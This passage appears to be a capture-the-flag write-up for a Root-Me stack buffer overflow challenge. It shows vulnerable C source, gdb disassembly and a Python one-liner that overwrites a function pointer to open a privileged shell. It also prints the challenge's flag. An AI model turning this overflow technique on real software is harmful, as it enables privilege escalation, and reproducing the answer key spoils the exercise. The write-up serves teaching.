@@ -259,6 +259,200 @@ Shell closed! Bye.
 
 ---
 
+## ELF x86 Stack buffer overflow basic 2
+
+- Author: Lyes
+- Date: 10 April 2015
+- Points: 10
+- Level: 1
+
+### Statement
+
+<details>
+
+<summary markdown="span">Source Code</summary>
+
+~~~c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+     
+void shell() {
+  setreuid(geteuid(), geteuid());
+  system("/bin/bash");
+}
+     
+void sup() {
+  printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
+}
+     
+void main()
+{
+  int var;
+  void (*func)()=sup;
+  char buf[128];
+  fgets(buf,133,stdin);
+  func();
+}
+~~~
+
+</details>
+
+### Connection Details
+
+- Host: challenge02.root-me.org
+- Protocol: SSH
+- Port:2222
+- SSH access: ssh -p 2222 app-systeme-ch15@challenge02.root-me.org 
+- Username: app-systeme-ch15
+- Password: app-systeme-ch15
+
+### Resources
+
+1. [youtube](https://www.youtube.com/watch?v=u-OZQkv2ebw).
+2. [Exploiting Stack Buffer Overflows in Linux x86 Kernel](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Exploiting%20Stack%20Buffer%20Overflows%20in%20the%20Linux%20x86%20Kernel.pdf).
+3. [64 bits Linux Stack Based Buffer Overflow](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution</summary>
+
+Reviewing the source code we can see the vulnerability in the buf variable:
+
+~~~c
+char buf[128];
+fgets(buf,133,stdin);
+~~~
+
+The variable buf is allocated 128 Bytes but the fgets reads 133 Bytes in.  We can overflow the buf buffer and write into the stack.  We can also see a call to the bash shell in shell().  We need to call that instead of funcP{
+
+Connecting, we can see the vulnerability:
+
+~~~shell
+$ ssh -p 2222 app-systeme-ch15@challenge02.root-me.org
+app-systeme-ch15@challenge02:~$ ls
+ch15  ch15.c  Makefile
+app-systeme-ch15@challenge02:~$ ./ch15
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 
+app-systeme-ch15@challenge02:~$ ./ch15
+000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012345
+Segmentation fault
+~~~
+
+We can decompile in gdb to find the address of the shell() function:
+
+~~~shell
+app-systeme-ch15@challenge02:~$ gdb ch15
+gdb) run
+Starting program: /challenge/app-systeme/ch15/ch15 
+1
+Hey dude ! Waaaaazzaaaaaaaa ?!
+[Inferior 1 (process 24071) exited with code 037]
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x08048584 <+0>:	lea    0x4(%esp),%ecx
+   0x08048588 <+4>:	and    $0xfffffff0,%esp
+   0x0804858b <+7>:	pushl  -0x4(%ecx)
+   0x0804858e <+10>:	push   %ebp
+   0x0804858f <+11>:	mov    %esp,%ebp
+   0x08048591 <+13>:	push   %ebx
+   0x08048592 <+14>:	push   %ecx
+   0x08048593 <+15>:	sub    $0x90,%esp
+   0x08048599 <+21>:	call   0x80485de <__x86.get_pc_thunk.ax>
+   0x0804859e <+26>:	add    $0x1a62,%eax
+   0x080485a3 <+31>:	lea    -0x1aa7(%eax),%edx
+   0x080485a9 <+37>:	mov    %edx,-0xc(%ebp)
+   0x080485ac <+40>:	mov    -0x4(%eax),%edx
+   0x080485b2 <+46>:	mov    (%edx),%edx
+   0x080485b4 <+48>:	sub    $0x4,%esp
+   0x080485b7 <+51>:	push   %edx
+   0x080485b8 <+52>:	push   $0x85
+   0x080485bd <+57>:	lea    -0x8c(%ebp),%edx
+   0x080485c3 <+63>:	push   %edx
+   0x080485c4 <+64>:	mov    %eax,%ebx
+   0x080485c6 <+66>:	call   0x8048390 <fgets@plt>
+   0x080485cb <+71>:	add    $0x10,%esp
+   0x080485ce <+74>:	mov    -0xc(%ebp),%eax
+   0x080485d1 <+77>:	call   *%eax
+   0x080485d3 <+79>:	nop
+   0x080485d4 <+80>:	lea    -0x8(%ebp),%esp
+   0x080485d7 <+83>:	pop    %ecx
+   0x080485d8 <+84>:	pop    %ebx
+   0x080485d9 <+85>:	pop    %ebp
+   0x080485da <+86>:	lea    -0x4(%ecx),%esp
+   0x080485dd <+89>:	ret    
+End of assembler dump.
+~~~
+  
+We can look at the memory address for shell:
+
+~~~shell
+(gdb) disassemble shell
+Dump of assembler code for function shell:
+   0x08048516 <+0>:	push   ebp
+   0x08048517 <+1>:	mov    ebp,esp
+   0x08048519 <+3>:	push   esi
+   0x0804851a <+4>:	push   ebx
+   0x0804851b <+5>:	call   0x8048450 <__x86.get_pc_thunk.bx>
+   0x08048520 <+10>:	add    ebx,0x1ae0
+   0x08048526 <+16>:	call   0x80483a0 <geteuid@plt>
+   0x0804852b <+21>:	mov    esi,eax
+   0x0804852d <+23>:	call   0x80483a0 <geteuid@plt>
+   0x08048532 <+28>:	sub    esp,0x8
+   0x08048535 <+31>:	push   esi
+   0x08048536 <+32>:	push   eax
+   0x08048537 <+33>:	call   0x80483d0 <setreuid@plt>
+   0x0804853c <+38>:	add    esp,0x10
+   0x0804853f <+41>:	sub    esp,0xc
+   0x08048542 <+44>:	lea    eax,[ebx-0x1990]
+   0x08048548 <+50>:	push   eax
+   0x08048549 <+51>:	call   0x80483c0 <system@plt>
+   0x0804854e <+56>:	add    esp,0x10
+   0x08048551 <+59>:	nop
+   0x08048552 <+60>:	lea    esp,[ebp-0x8]
+   0x08048555 <+63>:	pop    ebx
+   0x08048556 <+64>:	pop    esi
+   0x08048557 <+65>:	pop    ebp
+   0x08048558 <+66>:	ret    
+End of assembler dump.
+~~~
+
+We need to call address 0x08048516:
+
+~~~shell
+app-systeme-ch15@challenge02:~$ (python -c 'print("0"*128+"\x16\x85\x04\x08")'; cat) | ./ch15
+
+ls
+ch15  ch15.c  Makefile
+whoami
+app-systeme-ch15-cracked
+strings .passwd
+B33r1sSoG0oD4y0urBr4iN
+~~~
+  
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+B33r1sSoG0oD4y0urBr4iN
+~~~
+
+</details>
+
+---
+
+### [App - System](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
 Last updated Jan 2021.
 
 ## [djm89uk.github.io](https://djm89uk.github.io)
